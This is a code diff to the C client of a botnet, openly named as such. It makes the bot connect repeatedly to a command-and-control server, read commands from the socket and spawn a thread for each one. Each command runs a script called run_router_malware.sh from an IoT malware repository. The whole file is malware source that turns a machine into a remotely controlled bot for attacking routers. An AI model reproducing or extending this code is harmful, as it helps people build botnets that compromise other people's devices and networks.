@@ -9,8 +9,11 @@ Client code for botnet
 bot_t botInfo;
 
 int repeated_connect( const char * server, struct addrinfo * rp ) {
-    int   sd;
-    char  message[256];
+    /*
+    Repeatedly tries to connect to the C&C server
+    */
+    int  sd;
+    char message[256];
     
     do {
         if ( errno = 0, (sd = socket( rp->ai_family, rp->ai_socktype, rp->ai_protocol )) == -1 ) {
@@ -31,7 +34,6 @@ int main( int argc, char ** argv ) {
     int       ignore;
     char      message[256];
     char      welcomeMessage[512];
-    pthread_t commandInputThread;
     
     struct addrinfo      addrinfo;
     struct addrinfo *    result;
@@ -79,41 +81,44 @@ int main( int argc, char ** argv ) {
             sprintf(welcomeMessage, "\x1b[1;34mWelcome back, %s!\x1b[0m\n", botInfo.username);
             write(1, welcomeMessage, strlen(welcomeMessage));
             
-            pthread_create(&commandInputThread, NULL, commandInput, &sd);
-            pthread_join(commandInputThread, NULL);
-            pthread_cancel(commandInputThread);
+            commandInput(sd);
         }
     }
     return 0;
 }
 
-void *commandInput(void *vargp) {
+int commandInput(int sd) {
     /*
-    Receive commands from the C&C server to execute
+    Constantly listens on the socket descriptor to receive 
+    commands from the C&C server to execute. Spawns a 
+    new pthread to handle each command request
     */
-    int    sd = *((int *) vargp);
-    int    len, rc;
-    char   buffer[512];
+    int       len, rc;
+    char      buffer[512];
+    pthread_t runCommandThread;
 
     while ((len = read(sd, buffer, sizeof(buffer) - 1)) > 0) {
-        rc = runCommand(buffer);
-        if (rc != 0)
+        rc = pthread_create(&runCommandThread, NULL, runCommand, &buffer);
+        if ((int) rc != 0) {
             fprintf(stderr, "\x1b[1;31mRunning command '%s' failed\x1b[0m\n", buffer);
+            return -1;
+        }
     }
 
     printf("\x1b[1;31mConnection Terminated: killing bot %s\x1b[0m\n", botInfo.username);
     close(sd);
 
-    return NULL;
+    return 0;
 }
 
-int runCommand(char *command) {
+void *runCommand(void *vargp) {
     /*
     Calls fork() to run python code of the 
     specified command using execv()
     NOTE: Depends on malware_iot repo being installed
     */
-    int pid, status;
+    int  pid, status;
+    char *command = (char *) vargp;
     char *args[4] = {"../iot_malware/scripts/run_router_malware.sh", "-f"};
 
     printf("Attempting to run %s...\n", command);
@@ -125,7 +130,7 @@ int runCommand(char *command) {
         args[2] = "reset";
         args[3] = NULL;
     } else {
-        return -1;
+        return (void *) -1;
     }
 
     // Fork a new process to run the command using
@@ -146,5 +151,5 @@ int runCommand(char *command) {
                 printf("Pid %d exited abnormally\n", pid);
     }
 
-    return 0;
+    return (void *) 0;
 }
